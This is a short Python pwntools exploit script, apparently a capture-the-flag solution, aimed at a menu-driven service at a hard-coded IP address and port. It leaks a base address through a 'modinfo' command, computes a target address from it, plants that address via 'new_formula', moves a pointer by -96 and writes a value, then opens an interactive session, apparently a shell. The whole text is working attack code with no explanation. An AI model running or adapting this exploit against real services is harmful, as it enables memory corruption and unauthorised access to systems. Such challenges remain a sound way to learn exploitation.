from pwn import *


p = remote("35.198.185.193", 1339)
context.log_level='debug'
got = 0x0000000000001293

p.recvuntil("> ")
p.sendline("modinfo")
p.recvuntil("Base address: ")

addr = int(p.recv(14),16)
print "0x%x" % addr

attack = addr + got

p.recvuntil("> ")
p.sendline("new_formula " + p64(attack))

p.recvuntil("> ")
p.sendline("formula")

p.recvuntil("> ")
p.sendline("tap_pos")
p.recvuntil("The filling tap is at position ")
top_addr = int(p.recv(14),16)

p.recvuntil("> ")
p.sendline("move_tap -96")



p.sendline("fill "+'6')

p.interactive()
